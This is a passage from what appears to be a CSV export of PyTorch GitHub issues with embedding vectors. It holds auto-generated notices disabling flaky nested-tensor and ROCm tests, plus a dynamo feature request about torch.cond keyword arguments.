cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-2.97545522e-01  4.92185652e-02 -1.31326959e-01  1.73426103e-02
 -2.87155528e-02 -3.56375515e-01 -2.73221470e-02  1.26450434e-01
 -3.57569218e-01 -1.46375686e-01  3.25713098e-01 -2.98245270e-02
  2.24843055e-01  5.58166504e-02  4.51777913e-02 -6.56948388e-02
 -7.46610165e-02 -3.98353152e-02  3.97429526e-01  3.36682647e-02
 -2.78951228e-01  6.29852787e-02 -2.97020972e-01  2.72157907e-01
  1.02947295e-01 -5.99960610e-02 -2.35113442e-01 -7.08450004e-02
  9.34474766e-02  8.70870575e-02  2.50967979e-01  5.03893942e-02
 -2.35431403e-01  1.69581976e-02  4.86928552e-01  2.71580011e-01
 -6.34801611e-02 -1.45559266e-01 -3.57603490e-01 -8.50923136e-02
  2.11298794e-01 -6.39872253e-02 -1.11100033e-01 -1.30706817e-01
  1.86125964e-01 -6.54630214e-02 -2.25075960e-01  2.74031669e-01
 -2.85706043e-01 -3.51234861e-02  1.44522637e-01 -1.27743319e-01
 -8.06749240e-03 -4.79291797e-01  6.25425577e-02  9.40377824e-03
  1.13952398e-01  5.17704368e-01  9.58259851e-02  1.74707100e-01
  5.49470894e-02  1.34155499e-02 -1.57723218e-01  6.42462075e-03
 -8.00445750e-02 -3.59778106e-02  1.70813397e-01 -2.13376671e-01
  4.13681269e-01 -3.07935476e-03  1.06928647e-01 -1.54890224e-01
 -3.31149787e-01 -2.07561970e-01  2.42320776e-01  2.73884207e-01
 -3.29283655e-01  6.67683631e-02 -7.56829083e-02 -2.51957655e-01
 -8.09009224e-02 -1.53651740e-02 -5.35475835e-02  1.26032725e-01
  2.15357870e-01  6.41413853e-02  1.25903726e-01 -1.31885797e-01
  2.26739243e-01 -2.17884809e-01  1.23069488e-01  4.20470908e-02
 -1.40561268e-01 -2.15316303e-02 -1.45651340e-01  3.71494032e-02
  2.00563580e-01 -1.43011138e-01 -3.01446915e-01  1.25001222e-01
  7.22078979e-02 -4.88631666e-01 -1.58576872e-02  4.29239631e-01
 -2.95607448e-01 -3.46321523e-01  4.45252061e-01  9.31490064e-02
  1.10511705e-01 -1.01594478e-01  1.80459514e-01  6.00147545e-02
  6.19051829e-02  9.06887092e-03  8.36937577e-02 -7.01199919e-02
 -2.33352929e-01 -1.68193817e-01 -5.75153232e-02  5.11730492e-01
 -2.71536827e-01 -9.73700136e-02  1.50301993e-01 -1.30891586e-02
  1.73372805e-01  1.66184381e-02 -6.75104037e-02  4.14159894e-02
  1.61013812e-01  3.85795981e-02  9.85837206e-02  1.17832005e-01
 -1.47572696e-01 -1.87942415e-01  1.22822322e-01 -4.31707092e-02
 -1.30300134e-01 -2.51587033e-01  4.42351028e-02  4.97211516e-02
 -1.17180988e-01  2.05893874e-01  1.39536699e-02 -2.75838733e-01
  3.40226561e-01  3.30968872e-02 -3.38651948e-02  1.39121398e-01
 -6.95645213e-02  7.35383928e-02 -5.49648069e-02  2.63503008e-02
  2.25898832e-01  4.20182228e-01  7.20625371e-02  1.06496960e-01
  2.72657096e-01  1.39972806e-01  1.14758670e-01 -9.17616189e-02
 -9.82927978e-02  4.77665573e-01 -4.85035181e-02  6.20769560e-02
  3.46797705e-01 -1.77490562e-01 -3.84246677e-01  2.32781991e-02
 -5.66086732e-02  1.75288841e-01 -1.25659987e-01 -8.88562500e-02
  8.15105364e-02 -8.87619257e-02  7.83618838e-02 -7.47992769e-02
  3.02852660e-01 -3.83341372e-01 -2.01178089e-01  2.74367750e-01
  1.25613570e-01  8.03118348e-02  1.34657577e-01  5.36769740e-02
 -2.89655812e-02  2.69720674e-01  2.78906465e-01 -8.31837058e-02
 -4.75754589e-03  3.39419469e-02 -6.39979482e-01 -1.84991837e-01
  8.38753432e-02  7.95765221e-03 -2.55609214e-01 -2.15026483e-01
  9.11054760e-02 -8.96867812e-02  6.12973496e-02  9.46695432e-02
 -1.96874812e-01  4.32802618e-01  3.40093374e-01 -1.27941638e-01
 -9.87063721e-03  1.90893352e-01 -3.33794326e-01 -4.58525240e-01
  1.78020626e-01  8.97842459e-03 -1.79775968e-01 -6.99784309e-02
  1.14297971e-01 -3.15816134e-01 -4.68335599e-02  1.41887844e-01
 -4.72971052e-02  8.18392485e-02  1.80521421e-03  1.11788854e-01
 -3.03500891e-01  5.92202023e-02 -3.13746780e-01 -1.97695747e-01
 -3.00794423e-01  4.05310132e-02 -1.62961543e-01  2.68645316e-01
 -3.50548215e-02  2.50867680e-02 -5.23215830e-02 -2.73774922e-01
  1.87605143e-01 -1.10039860e-02  3.15052330e-01 -2.33022958e-01
 -1.42627478e-01 -5.00697568e-02  1.14181660e-01  5.39674163e-01
 -5.03522158e-01 -5.78078985e-01 -9.35741961e-02  1.85856313e-01
  9.07295123e-02  8.22556913e-02 -2.08007187e-01 -1.17685340e-01
 -9.60265249e-02  3.76057029e-02 -8.80545452e-02 -2.27267802e-01
  4.09210511e-02 -2.24354658e-02  4.66252044e-02  5.74723125e-01
 -1.77881762e-01  1.42857939e-01  2.20909715e-05 -4.94750217e-02
 -1.69644728e-01  4.87900555e-01 -1.29197389e-01  3.13382268e-01
  2.48225212e-01 -6.42658547e-02 -7.85493329e-02  1.14991166e-01
  1.17913783e-01 -1.82460323e-01  3.65978003e-01 -6.13820195e-01
 -7.56617635e-02  9.33549404e-02  2.56686449e-01 -1.13863751e-01
  3.71230364e-01  1.54779524e-01  5.98882399e-02 -1.93832591e-01
  1.58296138e-01  1.13676339e-01 -1.98101372e-01 -1.18150912e-01
  1.37361512e-01 -2.65364259e-01 -8.01408887e-02 -8.65459293e-02
 -2.94812858e-01 -9.60646644e-02 -1.02589376e-01  1.77924410e-01
  5.74341118e-02 -1.81155279e-04 -4.59604084e-01  1.26143070e-02
  2.60307461e-01 -2.84967422e-01  1.93243492e-02 -2.89472461e-01
 -6.20824359e-02 -3.59790139e-02  1.59573555e-01 -2.72467315e-01
 -6.89558908e-02 -1.45471662e-01  1.54427215e-01 -1.67456135e-01
  4.67804283e-01 -2.61175692e-01 -1.94037817e-02  3.45857561e-01
 -8.89580920e-02  2.49635577e-01  9.85565782e-02 -1.60991140e-02
 -1.11081176e-01  2.14774832e-01 -9.72111523e-02  1.77097544e-01
  2.96698332e-01 -1.56208202e-01 -3.17476511e-01  2.68395871e-01
  2.16786653e-01 -3.45311388e-02 -2.93752044e-01  5.92388213e-02
 -7.78011680e-02 -2.36999057e-02 -8.94107074e-02 -6.70480281e-02
 -5.90223186e-02 -7.13734329e-02  3.79716158e-02 -5.82944825e-02
 -9.84980017e-02  5.38756609e-01 -3.16284075e-02 -2.13829398e-01
  5.67000639e-03  4.77947891e-02  7.23744929e-02 -2.92307913e-01
 -2.11017698e-01 -1.13540560e-01  1.31172448e-01  8.08763206e-02
  1.64644122e-01  1.45502582e-01 -2.07495600e-01  5.28120957e-02
 -3.15436333e-01 -2.33888179e-01  5.74403964e-02  4.54881728e-01
  1.40083611e-01  1.00094125e-01  3.07166904e-01  6.35996282e-01
 -1.59159720e-01  5.08794934e-02 -2.62587816e-01 -2.63976544e-01
  1.87070504e-01 -6.86557218e-02 -6.40566349e-02 -6.82698786e-02
  7.48058856e-02  2.52597451e-01 -4.24364597e-01  2.61888266e-01
 -6.32279068e-02  1.96681991e-01  1.54470265e-01  5.18363677e-02
  2.10466638e-01 -3.35621357e-01 -1.54038481e-02  1.03183560e-01
 -2.48266906e-01  6.37687296e-02 -2.56251283e-02  1.86627090e-01]"
DISABLED test_as_nested_tensor_propagates_gradients_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_as_nested_tensor_propagates_gradients_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18019701994).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 9 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_as_nested_tensor_propagates_gradients_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-4.45799530e-01 -1.60864487e-01 -2.61301816e-01  4.06200774e-02
  1.68670475e-01 -2.57329285e-01  5.56313619e-02 -1.13770925e-01
 -4.63896573e-01 -2.22709119e-01  3.87476951e-01 -1.70643896e-01
  1.53690651e-01  7.19476938e-02 -1.02333650e-01  1.28549024e-01
 -1.72274426e-01  1.20619878e-01  3.25601965e-01 -2.69895382e-02
  2.53435876e-02 -7.28340894e-02 -3.04116309e-01  2.51007944e-01
  7.46542662e-02  1.42611563e-04 -1.41662836e-01 -1.10357918e-01
  1.99100718e-01  7.15919882e-02  3.02271515e-01  4.92428765e-02
 -3.75116944e-01  7.75917061e-03  1.53243333e-01  2.59487092e-01
 -4.07473296e-02 -1.82625324e-01 -2.31060699e-01  6.42960891e-04
  2.70470351e-01 -2.45311949e-03  3.94853838e-02 -6.57244176e-02
  1.05587624e-01 -3.16692814e-02 -5.32937460e-02  2.45996922e-01
 -3.38431478e-01 -1.63782179e-01  5.71368635e-02 -2.28743345e-01
 -1.80419281e-01 -5.89960396e-01  4.94975895e-02 -1.75099373e-01
  3.51986498e-01  2.81004608e-01  1.07630335e-01  1.42602334e-02
  1.15973838e-01 -6.17876425e-02 -5.90222739e-02  7.81485289e-02
 -9.46691930e-02  9.61493552e-02  1.88901022e-01 -2.99200565e-01
  5.78830123e-01  1.49321556e-01  2.48518378e-01 -1.03431962e-01
 -3.30116063e-01  1.12041542e-02  2.08775729e-01  1.93322301e-01
 -2.15282649e-01  1.32595852e-01  6.96829930e-02 -8.58079866e-02
  8.17439109e-02 -9.42494422e-02  5.80175258e-02 -3.25866044e-03
  2.57491410e-01  1.88155528e-02  1.35839224e-01 -7.93215930e-02
  2.31494784e-01 -1.77992523e-01  2.47517332e-01  6.04507998e-02
 -1.96728855e-01 -9.00833383e-02 -8.72155726e-02  1.01473741e-02
  2.08722264e-01 -1.48299575e-01 -1.87840641e-01  1.46014139e-01
 -8.26094765e-05 -3.77016515e-01 -2.31439412e-01  3.68500233e-01
 -1.03465587e-01  1.37253935e-02  2.94469893e-01 -2.38796547e-02
  1.60608307e-01 -4.71331961e-02  1.32317856e-01  2.50555854e-03
  8.48376155e-02  4.47135940e-02  1.02848887e-01 -7.58944303e-02
 -1.87205046e-01 -1.35984439e-02 -1.98340937e-02  8.14632177e-01
 -2.41688162e-01 -1.79344118e-01  1.60015345e-01  1.17858112e-01
  3.84101480e-01  1.04824871e-01 -1.94251388e-01  7.66054019e-02
  1.69068098e-01  3.07907276e-02  1.25459492e-01  1.90896720e-01
 -2.30113775e-01 -2.74209436e-02  7.61655271e-02  9.07757878e-03
 -2.08421081e-01 -2.92388439e-01  1.41829196e-02  6.90103322e-02
 -4.38102216e-01  3.65660667e-01 -3.34203243e-02 -2.15094149e-01
  4.60515648e-01 -7.53278434e-02 -1.22981861e-01  9.38875899e-02
 -1.17233753e-01 -9.67503116e-02 -1.66745499e-01  1.03290975e-01
  5.32384403e-02  1.69662699e-01  2.25728109e-01  2.42236927e-01
  2.62862056e-01  7.24529028e-02  5.50864190e-02 -2.94698745e-01
  4.40681949e-02  4.16272193e-01 -1.00753501e-01  1.05125293e-01
  3.29342425e-01 -1.61669239e-01 -4.04422700e-01  6.04769923e-02
  8.92495811e-02  1.76636308e-01  1.82751995e-02 -3.34629230e-02
  8.87234583e-02  4.33587059e-02  5.56731932e-02 -8.76156092e-02
  1.07333258e-01 -5.61785936e-01 -1.99533403e-01  2.75807381e-01
  1.30962521e-01 -2.05059886e-01  2.07623765e-01  8.85355398e-02
 -1.47948354e-01  3.24655503e-01  2.40885735e-01 -1.19576573e-01
 -1.47005334e-01 -2.60789767e-02 -5.21968782e-01 -1.40933827e-01
  1.83227956e-01 -2.51279287e-02 -2.54027754e-01 -1.93923011e-01
  7.28713125e-02 -5.27346320e-02 -3.48460004e-02  1.00156441e-01
 -3.03906292e-01  8.42798054e-02  1.16668291e-01  1.88736035e-03
 -4.15023938e-02  2.80530639e-02 -5.88864423e-02 -2.70385772e-01
 -9.98510122e-02  1.61576480e-01 -1.57907635e-01 -1.12491496e-01
 -1.13522798e-01 -2.86576629e-01 -3.91517989e-02  5.88830467e-03
  1.08773723e-01  2.52719969e-03  4.77658361e-02  2.63106525e-01
 -1.51471347e-01 -9.42216218e-02 -4.18938875e-01 -1.96268603e-01
 -5.25711119e-01 -1.36555120e-01 -3.25264663e-01  3.22496295e-01
 -3.01347136e-01  2.14556128e-01 -1.92900136e-01 -1.16204605e-01
  1.69254750e-01  1.32014267e-02  4.15266037e-01 -3.22309196e-01
 -1.29839554e-01 -1.84253290e-01  2.09795944e-02  5.20774424e-01
 -5.97003102e-01 -1.54009014e-01 -9.46076214e-02  9.77195054e-02
  5.43097928e-02  2.15417132e-01 -1.07291184e-01 -5.06253764e-02
 -1.82176679e-01  2.68936336e-01 -1.58918619e-01 -2.27330908e-01
  1.40245214e-01  1.08850032e-01  4.69356328e-02  4.85440612e-01
 -2.59154201e-01  1.14171743e-01 -1.00938819e-01  1.51004806e-01
  7.92395994e-02  2.66557515e-01 -1.47144467e-01  5.14592230e-01
  1.77341074e-01  2.56787658e-01 -2.76539266e-01  1.52426809e-01
  5.87903224e-02 -1.67400718e-01  3.69488746e-01 -3.60483885e-01
  6.11809492e-02 -1.01591550e-01  1.12945706e-01 -1.17418543e-02
  3.75341415e-01  2.51812637e-01 -1.79970056e-01 -2.29354382e-01
  1.05796494e-01  2.09345549e-01 -8.07767808e-02  7.33346045e-02
 -9.14139822e-02 -2.52219707e-01 -1.91392869e-01 -1.45633042e-01
 -2.41617113e-01 -1.40926689e-01 -1.54739857e-01  1.95248142e-01
  3.47520828e-01 -2.79746242e-02 -3.62746775e-01  7.88539052e-02
  3.59813035e-01 -2.71310508e-01 -2.70739011e-02 -3.08973014e-01
  2.85562128e-05  3.48961763e-02  1.41435862e-01 -4.66886908e-01
  5.92381842e-02 -1.60565346e-01  3.19096148e-01 -1.75652444e-01
  3.93052369e-01 -4.78999376e-01  2.57289231e-01  2.03452140e-01
  1.37365103e-01  2.71238327e-01  9.63652972e-03 -2.73830034e-02
 -2.16783300e-01  3.59749585e-01  1.02886751e-01  8.15915242e-02
  2.60533988e-01 -1.47135526e-01 -3.10946882e-01  1.30651832e-01
  1.40954107e-01  3.94787937e-02 -2.96320617e-01 -2.33682677e-01
 -7.28165656e-02 -8.78548473e-02 -1.01013526e-01 -8.64124671e-02
 -1.31244719e-01 -4.13853228e-02  5.79069629e-02  6.57389499e-03
 -2.57361054e-01  5.20024180e-01 -4.92776185e-03 -1.07628390e-01
  7.44449869e-02  2.27865167e-02  1.27438605e-01 -2.50134975e-01
 -1.44142672e-01 -2.38361850e-01  2.06657097e-01  5.72912246e-02
  2.75611281e-01  1.93373144e-01 -1.78577542e-01  1.28313869e-01
 -3.59966099e-01 -1.11489445e-01  2.02593535e-01  5.52251220e-01
  2.14737318e-02 -1.71870105e-02  1.27226710e-01  7.26184249e-01
 -2.52471626e-01 -5.88746704e-02 -3.85497391e-01 -2.83664614e-01
  2.03634769e-01 -1.58846244e-01  1.33813843e-01 -1.60238132e-01
  1.07054003e-01  3.84250700e-01 -3.67820501e-01  2.21033961e-01
 -1.59763753e-01  2.85698652e-01  8.71012360e-02 -2.35128284e-01
  1.21184416e-01 -1.80326596e-01 -9.97867063e-02 -5.55890203e-02
 -4.36052009e-02  2.63573945e-01 -1.42825563e-02  1.79992206e-02]"
DISABLED test_accumulate_grad_different_strides_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_accumulate_grad_different_strides_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18008909931).

Over the past 3 hours, it has been determined flaky in 9 workflow(s) with 27 failures and 9 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_accumulate_grad_different_strides_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.25517854  0.08360731 -0.14176793 -0.07840528  0.03339349 -0.13649578
 -0.02347106  0.09750681 -0.38403213 -0.27048814  0.31822538 -0.08126722
  0.20042531  0.06078014 -0.073181   -0.12536934 -0.10597496 -0.09447607
  0.5466056   0.10063621 -0.26820546 -0.03213884 -0.31374666  0.20854431
  0.13785528  0.09067288 -0.24490304 -0.07477702  0.12083185  0.10209265
  0.36067438  0.14385606 -0.14473492  0.09512431  0.44896552  0.24992093
 -0.12773108 -0.10252029 -0.22187766 -0.0418      0.20209962 -0.03346243
 -0.14540732 -0.14526965  0.23900394 -0.15281628 -0.25860634  0.23622024
 -0.29436287 -0.03922905  0.10731988 -0.253061    0.07668204 -0.35537487
  0.0773535  -0.00908863  0.11639638  0.47178274  0.09686925  0.115394
  0.13322917  0.09377053 -0.20945129 -0.02667287 -0.09906164  0.08708484
  0.17009038 -0.22892064  0.52111137  0.08279812  0.21978703 -0.10634239
 -0.35059687 -0.17994246  0.22377628  0.17747314 -0.35065222  0.05118117
 -0.08667482 -0.21682535 -0.12434591  0.03468892 -0.11584338  0.00820637
  0.18670568  0.02991054  0.07808267 -0.07737247  0.08040986 -0.25375468
  0.21941452  0.08757949 -0.08217008  0.03685224 -0.07883321  0.0813145
  0.07952785 -0.14594835 -0.19183487  0.16193554  0.01227226 -0.24664594
  0.01688869  0.44605604 -0.2712453  -0.3690691   0.44592896  0.05090415
 -0.0541921  -0.01727877  0.0774299   0.07050849  0.17208466  0.12214774
  0.20115863 -0.07386918 -0.3428804  -0.08546198  0.02464671  0.67091393
 -0.16255833 -0.0126963   0.13466448 -0.00592839  0.13675842  0.01730143
 -0.01569928  0.06762144  0.17026299 -0.03486296  0.00218989  0.1565284
 -0.14286584 -0.20490111  0.12527806  0.09700686 -0.18916327 -0.29399762
  0.08722916  0.15426259 -0.17113899  0.39359355  0.11691493 -0.12892725
  0.23949885  0.10623125  0.02150621  0.10629208 -0.02252165 -0.08462937
 -0.12160861 -0.07479694  0.19428238  0.24413007  0.05568536  0.08688217
  0.3617575   0.11644773  0.02607212 -0.00211426 -0.01154532  0.40214562
 -0.01646573  0.14850314  0.27603585 -0.12832236 -0.33347845 -0.0887472
  0.13167687  0.26822838 -0.02646586 -0.20399883  0.15112817 -0.07454197
  0.13369647 -0.23587926  0.31017748 -0.38431293 -0.07857165  0.15667519
  0.08536709  0.07234846  0.0942723   0.04813477 -0.09920034  0.275553
  0.16481644 -0.06408899 -0.0230165   0.04599476 -0.56611514 -0.10598069
  0.00238921 -0.04975147 -0.27356413 -0.18221432  0.08297469 -0.04067301
 -0.10281104  0.06476019 -0.29410058  0.32450187  0.27700716 -0.20672657
  0.09751275  0.22972652 -0.3160696  -0.36986572  0.1069429  -0.0444524
 -0.2210931  -0.19611992 -0.04636569 -0.19607364 -0.0293245   0.01765788
  0.12555273  0.02208384 -0.09461597  0.16347283 -0.35844123 -0.03474927
 -0.276816   -0.13549064 -0.30752954 -0.11438033 -0.12823087  0.25473762
  0.05049995  0.10167399 -0.10784073 -0.21343559  0.145437    0.04000621
  0.31299475 -0.31254533 -0.02353688 -0.09162302 -0.01525105  0.4596694
 -0.4328123  -0.5118393  -0.06099175  0.08194937  0.17143273 -0.05109456
  0.01457494 -0.3310728  -0.05570263 -0.0087094  -0.2263282  -0.11043477
  0.10560146 -0.09348068  0.1546208   0.40045977 -0.32781994  0.04628075
 -0.00573421 -0.09504151 -0.16904095  0.42196682 -0.23637311  0.27978224
  0.26834932  0.07883283 -0.15022233  0.02723641  0.19354916 -0.13749118
  0.39938226 -0.6020944   0.08875644  0.0617093   0.22890711  0.02253453
  0.33875188  0.23504105  0.06546772 -0.1688193   0.2360773   0.04810791
 -0.17211153 -0.07588504  0.14107417 -0.18290614 -0.25614744 -0.16324303
 -0.29410678 -0.14408073 -0.08325829  0.19632202 -0.01269935 -0.05533024
 -0.34970403  0.0229637   0.34997475 -0.2625307  -0.00472488 -0.2866252
 -0.08838651 -0.05779216  0.11492519 -0.2829757  -0.16864625 -0.03053345
  0.06912158  0.00374477  0.3453043  -0.13434967  0.21616213  0.30768275
 -0.0476224   0.20947954 -0.01479202 -0.02712121 -0.16986386  0.20596768
  0.09426794  0.14814593  0.33921814 -0.0693216  -0.3685661   0.24109991
  0.23698235 -0.18997312 -0.50543046 -0.04895009 -0.1811795  -0.03337485
  0.04139224 -0.12309104 -0.07406818 -0.13295865  0.01588757 -0.05804585
 -0.19231269  0.4395678  -0.01526195 -0.25063133  0.09702897 -0.01501134
  0.20812827 -0.34407395 -0.2733784   0.02794122  0.2137186   0.11288825
 -0.01630645  0.20159392 -0.14212105  0.1050764  -0.24540259 -0.321037
  0.20873657  0.4103791   0.29251128  0.02867427  0.24376133  0.672866
 -0.13261142 -0.09172972 -0.15628096 -0.23864824  0.08167575 -0.17337151
 -0.06296018 -0.12329478  0.12763965  0.20703487 -0.4232682   0.17359564
 -0.1728606   0.22411224  0.243348   -0.01559534  0.11684252 -0.3944838
 -0.06678654  0.01833696  0.01444112 -0.05239746  0.04690815  0.26511925]"
DISABLED test_complex_half_reference_testing_nn_functional_conv_transpose3d_cuda_complex32 (__main__.TestCommonCUDA) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/6557415708/job/17809641044

```
======================================================================
FAIL: test_complex_half_reference_testing_nn_functional_conv_transpose3d_cuda_complex32 (__main__.TestCommonCUDA)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/opt/conda/envs/py_3.8/lib/python3.8/site-packages/torch/testing/_internal/common_utils.py"", line 2453, in wrapper
    method(*args, **kwargs)
  File ""/opt/conda/envs/py_3.8/lib/python3.8/site-packages/torch/testing/_internal/common_utils.py"", line 2453, in wrapper
    method(*args, **kwargs)
  File ""/opt/conda/envs/py_3.8/lib/python3.8/site-packages/torch/testing/_internal/common_device_type.py"", line 415, in instantiated_test
    result = test(self, **param_kwargs)
  File ""/opt/conda/envs/py_3.8/lib/python3.8/site-packages/torch/testing/_internal/common_device_type.py"", line 908, in test_wrapper
    return test(*args, **kwargs)
  File ""test_ops.py"", line 1222, in test_complex_half_reference_testing
    self.assertEqual(actual, expected, exact_dtype=False)
  File ""/opt/conda/envs/py_3.8/lib/python3.8/site-packages/torch/testing/_internal/common_utils.py"", line 3356, in assertEqual
    raise error_metas.pop()[0].to_error(
AssertionError: Tensor-likes are not close!

Mismatched elements: 1 / 1120 (0.1%)
Greatest absolute difference: 0.5810546875 at index (0, 0, 4, 1, 2) (up to 0.09 allowed)
Greatest relative difference: 0.1502685546875 at index (0, 0, 4, 1, 2) (up to 0.09 allowed)

To execute this test, run the following from the base repo dir:
    PYTORCH_TEST_WITH_ROCM=1 python test_ops.py -k test_complex_half_reference_testing_nn_functional_conv_transpose3d_cuda_complex32
```

cc @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-0.05288512 -0.09961613 -0.13183421  0.10105833 -0.05365838 -0.24811856
  0.1973426   0.17542368 -0.58334035 -0.22764745  0.26536655 -0.39825237
  0.05911322  0.07823654 -0.29995942 -0.04550017 -0.01244903 -0.0936076
  0.12551196  0.04548787 -0.14896607 -0.1096095  -0.40693164  0.18097928
 -0.15485701  0.22198637 -0.18226099  0.04131766 -0.12720051  0.18460046
  0.160566    0.16096026 -0.01909622  0.01034627  0.28763896 -0.0933385
 -0.3251077  -0.2962569  -0.08836207 -0.21135703  0.0116371  -0.02122072
  0.00461688  0.15802798 -0.17081122  0.0361108  -0.07386175  0.06266935
 -0.07655732 -0.19160093  0.16667347 -0.21026419 -0.08815351 -0.47318965
 -0.04819084 -0.01298714  0.29128516  0.26622123  0.13843057  0.18666908
  0.17502679 -0.16380253 -0.11519863 -0.06677096  0.15196697  0.21562651
 -0.05425913 -0.4106104   0.33324817  0.25580755 -0.04035901  0.00369895
 -0.22363473  0.21208751  0.17830056  0.3398673  -0.10619253 -0.01893184
 -0.10490584 -0.18305509 -0.14249703  0.01649421  0.06483324 -0.20661002
  0.30448213 -0.09097539  0.05884428  0.02540633  0.02899607 -0.15909794
  0.23445891  0.08119622  0.16404139  0.02519412  0.01753126 -0.10537779
 -0.12395802 -0.05762651 -0.45751595  0.02086963 -0.15398577 -0.11317496
 -0.3516766   0.1865192  -0.5198684  -0.15488136  0.23581982 -0.10277507
  0.00962521  0.25935525  0.0737573  -0.0154022   0.05833872  0.32788914
  0.09237103  0.18801695 -0.16696176 -0.14251997  0.04059455  0.3633768
 -0.20492972 -0.33911395  0.08306607  0.05163115  0.24052858 -0.12937617
 -0.08652142  0.16167502 -0.01513542  0.11868592  0.01121169 -0.00934784
  0.09306958  0.06279728 -0.27651393  0.06840108 -0.09125078 -0.13798931
  0.11704587  0.24112943 -0.24480078  0.33523533 -0.15378322 -0.18064073
  0.3252864   0.00112169 -0.45965075  0.20606726  0.10876025  0.16200346
  0.13799244 -0.00494246 -0.01454552  0.612473    0.04847675 -0.00368671
  0.4656656   0.07874382 -0.3162371  -0.19691281 -0.17824465  0.14947385
 -0.03230895  0.07874499  0.24808754 -0.05587481 -0.38015413  0.10289228
 -0.04635344  0.24772064  0.13607493  0.07538962  0.3322823   0.03082182
  0.07779149 -0.23751423  0.03082807 -0.24463385 -0.11952679  0.07802316
 -0.03267284  0.0173747   0.41250384 -0.15905437 -0.07202592  0.17169684
  0.07328548  0.20733859 -0.04555403  0.02294772 -0.5146885   0.17427054
 -0.02365408 -0.04338739 -0.22650933 -0.14530212  0.12051396 -0.08267757
  0.02849138  0.05314621 -0.01467363  0.12312385  0.01839526 -0.3291611
 -0.0848119   0.00363553 -0.12858692 -0.400205    0.18471563  0.20831546
 -0.2026483  -0.44937927 -0.335671   -0.19505264 -0.05338098  0.04499102
 -0.0670237  -0.07311462 -0.2833525   0.17352132  0.06649113 -0.06039649
 -0.13619183 -0.26247737 -0.44966835 -0.15293059  0.02827076  0.03170016
 -0.09501141  0.13662283  0.05994027 -0.25482282  0.09180325  0.04553345
  0.29581785 -0.05119522 -0.23823428 -0.22808546 -0.03867209  0.05783249
 -0.14722857 -0.26226968 -0.28043312  0.08141412  0.18711619  0.47766918
 -0.22951585  0.06356571 -0.2983073   0.17981252  0.00118797 -0.18881406
  0.1386292   0.24972421 -0.12463811  0.21501824  0.07613437 -0.04748963
  0.1794116  -0.10221966  0.26623517  0.36382714 -0.23770306  0.5790793
  0.43407083  0.3442212  -0.4488473   0.05066616 -0.15782642  0.07645375
  0.18823402 -0.60754883  0.23777235  0.01076049  0.35644087 -0.2505241
  0.4918549   0.00439615 -0.17391038  0.01525238  0.25115353  0.01461786
  0.03984961  0.33431822  0.2126012  -0.10753758 -0.14139196 -0.3132557
 -0.23801622 -0.1677837   0.04725215  0.3544768   0.2806899   0.04508597
 -0.33071226  0.23565733  0.3773371  -0.04083929  0.2800386  -0.0123649
 -0.31317592  0.15745038  0.01378577 -0.42289656 -0.07032038 -0.06440566
  0.01725383  0.15885851  0.23199877 -0.31129637 -0.0302119   0.18842341
  0.01147091  0.38550675  0.03581654  0.04081196  0.09328914  0.27026087
  0.03688951  0.09709288  0.261837   -0.30859184 -0.15786393  0.09052259
  0.17253569  0.12121565 -0.44465482 -0.12767966 -0.11264113  0.11562994
  0.07817272 -0.24729331 -0.18699965  0.15673238  0.05305092 -0.05536835
 -0.01694527  0.45902205  0.23881076 -0.3104417  -0.23832715 -0.09274189
 -0.05633257 -0.09915967 -0.19244535 -0.05051917  0.33745265  0.43638045
 -0.1292227   0.24383153  0.06004627  0.15724173 -0.11386915  0.0408952
  0.17471603  0.32603717  0.20275271  0.23800524  0.16671348  0.18505156
 -0.22934882  0.03266681 -0.5921701   0.06731375  0.21367684 -0.21018052
 -0.06354262 -0.21662292  0.25856215  0.15819551 -0.37630695  0.31123015
 -0.07732859 -0.03092506  0.4326405  -0.15748185  0.32050058 -0.17130661
 -0.28575146  0.21353018  0.22521673 -0.02847992  0.03966509 -0.14497003]"
[dynamo] `CondHigherOrderVariable` should handle kwargs by flattening to args triaged oncall: pt2 module: higher order operators,"### ðŸš€ The feature, motivation and pitch

Currently, I believe it is not flattened. We throw an error if len(args) != 4

However, users may do something like the following:

```python
torch.cond(pred=True, true_fn=lambda x: x +1, false_fn=lambda x: x - 1, operands=(torch.tensor([0]),))
```
Causing a graph break when it could have been trivially traced within dynamo


